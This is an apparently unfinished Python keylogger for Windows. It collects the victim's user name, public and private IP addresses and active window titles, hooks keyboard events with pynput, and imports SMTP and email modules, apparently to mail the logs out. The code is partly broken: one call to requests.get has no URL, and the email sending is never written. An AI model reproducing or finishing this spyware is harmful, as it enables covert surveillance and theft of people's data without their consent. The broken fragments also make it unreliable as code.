from pynput.keyboard import Key, Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import config

publicIP = requests.get()

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)
old_app = ''
delete_file = []


def on_press(key):
    global old_app
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass


with Listener(on_press=on_press) as listener:
    listener.join()
